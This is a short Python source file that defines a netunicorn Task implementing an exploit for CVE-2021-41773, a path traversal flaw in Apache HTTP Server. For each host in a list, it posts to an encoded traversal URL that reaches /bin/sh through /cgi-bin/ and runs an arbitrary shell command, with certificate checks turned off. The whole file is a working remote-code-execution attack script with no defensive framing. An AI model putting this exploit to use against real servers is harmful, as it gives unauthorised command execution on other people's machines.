from netunicorn.base import Task


class CVE202141773(Task):
    requirements = ["pip install requests"]

    def __init__(self, hosts: list[str], command: str, *args, **kwargs):
        self.hosts = hosts
        self.command = command
        super().__init__(*args, **kwargs)

    def run(self):
        import requests

        for host in self.hosts:
            url = f"https://{host}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
            data = f"echo Content-Type: text/plain; echo; {self.command}"
            requests.post(url, data=data, verify=False)
